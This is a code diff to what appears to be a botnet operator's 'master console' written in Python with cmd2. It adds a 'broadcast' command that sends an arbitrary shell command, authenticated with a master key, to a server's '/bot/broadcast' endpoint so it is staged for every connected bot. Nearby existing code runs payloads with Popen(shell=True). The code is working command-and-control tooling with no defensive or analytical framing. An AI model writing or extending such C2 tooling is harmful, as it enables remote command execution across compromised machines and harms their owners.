@@ -229,6 +229,22 @@ ___  ___          _              _____                       _
             #print("[*] payload = ", payload)
             process = Popen(payload, shell=True)
 
+    broadcast_parser = argparse.ArgumentParser()
+    broadcast_parser.add_argument('-c', '--command', type=str, help='Command to push')
+
+    @cmd2.with_category(CUSTOM_CATEGORY)
+    @cmd2.with_argparser(broadcast_parser)
+    def do_broadcast(self, args):
+        url = URL + '/bot/broadcast'
+        masterkey = MASTERKEY
+        cmd = args.command 
+
+        data = {'masterkey': MASTERKEY, 'cmd': cmd}
+
+        res = requests.post(url, data=data)
+
+        output_broadcast = ansi.style('[+] Broadcast command has been staged.')
+        #self.poutput()
 
 
     @cmd2.with_category(CUSTOM_CATEGORY)
@@ -240,6 +256,8 @@ ___  ___          _              _____                       _
     def do_quit(self, arg):
         self.poutput(ansi.style('\nExiting master console, bye.\n', fg='blue', bold=True))
         return True
+
+
 
 
 if __name__ == '__main__':
